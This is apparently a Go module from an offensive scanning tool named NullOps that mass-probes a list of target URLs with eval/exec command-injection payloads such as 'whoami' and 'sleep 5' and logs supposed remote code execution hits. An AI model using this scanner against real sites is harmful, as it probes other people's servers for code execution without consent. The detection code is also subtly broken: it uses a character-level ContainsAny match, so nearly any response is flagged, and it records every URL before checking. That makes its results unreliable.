package Scanners

import (
	"NullOps/CLI_Handlers"
	"NullOps/Helpers"
	"NullOps/Interface"
	"fmt"
	"strconv"
	"strings"
	"time"
)

var payloadRCE = []string{
	"eval('ls')",
	"eval('pwd')",
	"eval('pwd');",
	"eval('sleep 5')",
	"eval('sleep 5');",
	"eval('whoami')",
	"eval('whoami');",
	"exec('ls')",
	"exec('pwd')",
	"exec('pwd');",
	"exec('sleep 5')",
	"exec('sleep 5');",
	"exec('whoami')",
	"exec('whoami');",
}

var responsesRCE = []string{
	"system",
	"shell_exec",
	"exec",
	"eval",
	"shell_exec",
}

func scanRCE(config *Helpers.Runner) *Helpers.RunnerResult {
	for _, payload := range payloadRCE {
		mu.Lock()
		Helpers.PayloadsTested++
		mu.Unlock()
		Response, Error := Helpers.SendRequest(config.Line, "GET", payload, Helpers.RequestOptions{})

		if Error == nil {
			for _, resp := range responsesRCE {
				err := CLI_Handlers.AppendToFile(Helpers.OutputPath+"/RCE.txt", []string{config.Line + payload})
				CLI_Handlers.LogError(err)
				if strings.ContainsAny(string(Response.Body), resp) {
					return &Helpers.RunnerResult{
						Line:   Helpers.ExtractDomain(config.Line) + " | Payload: " + resp,
						Status: true,
						Error:  nil,
					}
				}
			}
		}
	}

	return &Helpers.RunnerResult{
		Line:   config.Line,
		Status: false,
		Error:  fmt.Errorf("Invalid"),
	}
}

func ScannerRCE(config *Helpers.ScanConfig) {
	Helpers.Valid, Helpers.Invalid, Helpers.Checked, Helpers.PayloadsTested, Helpers.CPM, Helpers.HighestCPM, Helpers.Running = 0, 0, 0, 0, 0, 0, true

	FilePath := CLI_Handlers.GetFilePath()
	lines, err := CLI_Handlers.ReadLines(FilePath)
	CLI_Handlers.LogError(err)

	startTime := time.Now()
	go func() {
		for {
			if Helpers.Running {
				mu.Lock()
				tested := strconv.Itoa(Helpers.PayloadsTested)
				elapsedTime := time.Since(startTime)
				valid := Helpers.Valid + Helpers.Invalid
				Helpers.CPM = int(Helpers.CalculateCPM(valid, elapsedTime))
				Helpers.HighestCPM = Helpers.BestCPM(Helpers.CPM, Helpers.HighestCPM)
				mu.Unlock()

				Interface.StatsTitle(fmt.Sprintf("NullOps | Payloads Tested: %v | CPM: %v | Highest CPM: %v", tested, Helpers.CPM, Helpers.HighestCPM), Helpers.Valid, Helpers.Invalid, Helpers.Checked, len(lines))
				time.Sleep(1 * time.Second)
			} else {
				return
			}
		}
	}()

	defer func() {
		Helpers.Running = false
	}()

	Helpers.Threading(func(s string) {
		ScanConfig := Helpers.Runner{Line: s}
		RunnerResult := scanRCE(&ScanConfig)

		if RunnerResult.Error == nil {
			mu.Lock()
			Helpers.Valid++
			mu.Unlock()
			Interface.Option(config.Name, fmt.Sprintf("%v | Status: %v", RunnerResult.Line, RunnerResult.Status))
		} else {
			mu.Lock()
			Helpers.Invalid++
			mu.Unlock()
			if config.PrintInvalid {
				Interface.Option(config.Name, fmt.Sprintf("%v | Status: %v | Reason: %v", Helpers.ExtractDomain(RunnerResult.Line), RunnerResult.Status, RunnerResult.Error))
			}
		}
		mu.Lock()
		Helpers.Checked++
		mu.Unlock()
	}, config.Threads, lines)
}
